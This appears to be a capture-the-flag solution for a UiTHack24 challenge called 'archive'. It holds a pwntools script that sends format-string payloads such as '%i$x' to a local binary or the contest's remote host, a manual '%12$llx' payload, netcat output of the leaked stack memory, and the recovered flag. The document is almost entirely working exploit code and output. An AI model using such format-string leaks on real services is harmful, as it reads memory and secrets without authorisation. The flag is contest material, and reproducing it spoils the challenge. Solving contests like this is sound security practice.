from pwn import *
import sys, os

context.binary = elf = ELF("./archive", checksec=False)
context.log_level = "warn"


REMOTE = len(sys.argv) > 1 and "remote" in sys.argv[1].lower()

for i in range(0, 100):
    if REMOTE: r = remote("uithack.td.org.uit.no", 9002)
    else:      r = process(elf.path)

    r.recvuntil(b"read?")
    r.sendline(b"%"+ str(i).encode() +b"$x")
    data = r.recvall(timeout = 1).decode().strip()
    print(data, end="")
    r.close()


%12$llx %13$llx %14$llx %15$llx %16$llx

UiTHack24{h3xa_4rch1ves}

└─$ nc uithack.td.org.uit.no 9002
What book do you want to read?
%12$llx %13$llx %14$llx %15$llx %16$llx
326b636148546955 345f617833687b34 7d73657631686372 %